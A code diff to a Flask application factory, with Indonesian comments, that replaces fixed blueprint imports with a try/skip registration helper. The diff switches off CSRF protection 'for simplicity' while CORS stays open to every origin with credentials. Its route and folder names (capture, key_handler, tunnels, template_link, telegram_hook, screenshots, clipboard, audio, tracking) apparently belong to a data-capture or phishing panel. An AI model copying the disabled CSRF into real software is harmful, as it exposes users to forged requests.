@@ -11,43 +11,81 @@ csrf = CSRFProtect()
 def create_app():
     app = Flask(__name__, template_folder="templates", static_folder="static")
     app.config["SECRET_KEY"] = Config.SECRET_KEY
-    app.config["WTF_CSRF_ENABLED"] = True
+    app.config["WTF_CSRF_ENABLED"] = False  # CSRF off untuk simpel
     app.config["SQLALCHEMY_DATABASE_URI"] = Config.DATABASE_URL
     app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
     app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024
 
-    for d in [Config.UPLOAD_DIR, Config.SCREENSHOT_DIR, Config.BURST_DIR,
-              Config.KEYS_DIR, Config.CLIPBOARD_DIR, Config.AUDIO_DIR,
-              Config.VIDEO_DIR, Config.TRACKING_DIR]:
+    # Bikin folder
+    for d in [Config.UPLOAD_DIR]:
         os.makedirs(d, exist_ok=True)
 
     CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)
-    csrf.init_app(app)
     db.init_app(app)
 
-    from app.routes import capture, api, burst, telegram_hook, intel
-    for m in [capture, api, burst, telegram_hook, intel]:
-        csrf.exempt(m.bp)
+    # ============================================================
+    # REGISTER BLUEPRINTS
+    # ============================================================
+    # Semua blueprint di-import di sini.
+    # Kalau file route tidak ada, tinggal comment importnya.
 
-    from app.routes.capture import bp as capture_bp
-    from app.routes.dashboard import bp as dash_bp
-    from app.routes.api import bp as api_bp
-    from app.routes.burst import bp as burst_bp
-    from app.routes.telegram_hook import bp as tg_bp
-    from app.routes.intel import bp as intel_bp
+    registered = []
 
-    app.register_blueprint(capture_bp)
-    app.register_blueprint(dash_bp)
-    app.register_blueprint(api_bp, url_prefix="/api")
-    app.register_blueprint(burst_bp, url_prefix="/burst")
-    app.register_blueprint(tg_bp, url_prefix="/tg")
-    app.register_blueprint(intel_bp, url_prefix="/intel")
+    def _register(name, import_path, prefix=None):
+        """Helper register blueprint."""
+        try:
+            mod = __import__(import_path, fromlist=[name])
+            bp = getattr(mod, name)
+            if prefix:
+                app.register_blueprint(bp, url_prefix=prefix)
+            else:
+                app.register_blueprint(bp)
+            registered.append(import_path)
+            return True
+        except Exception as e:
+            print(f"[skip] {import_path}: {e}")
+            return False
 
+    # Capture (wajib)
+    _register("bp", "app.routes.auth_route")
+
+    # Dashboard (wajib)
+    _register("bp", "app.routes.dashboard")
+
+    # API (wajib)
+    _register("bp", "app.routes.api", "/api")
+
+    # Optional
+    _register("bp", "app.routes.tunnels")
+    _register("bp", "app.routes.template_link")
+    _register("bp", "app.routes.modes")
+    _register("bp", "app.routes.osint_pro")
+    _register("bp", "app.routes.editor_route")
+    _register("bp", "app.routes.key_handler", "/tg")
+    _register("bp", "app.routes.replay", "/api")
+    _register("bp", "app.routes.reports")
+    _register("bp", "app.routes.burst", "/burst")
+    _register("bp", "app.routes.templates_gallery")
+    _register("bp", "app.routes.features")
+    _register("bp", "app.routes.qr")
+    _register("bp", "app.routes.telegram_hook", "/tg")
+    _register("bp", "app.routes.intel", "/intel")
+    _register("bp", "app.routes.license_route")
+    _register("bp", "app.routes.capture")
+    _register("bp", "app.routes.control", "/api")
+
+    # ============================================================
+    # INIT DB
+    # ============================================================
     with app.app_context():
         init_db()
 
+    # ============================================================
+    # HEALTH CHECK
+    # ============================================================
     @app.route("/healthz")
     def _health():
-        return {"ok": True}
+        return {"ok": True, "registered": len(registered)}
 
+    print(f"[app] {len(registered)} blueprints registered")
     return app
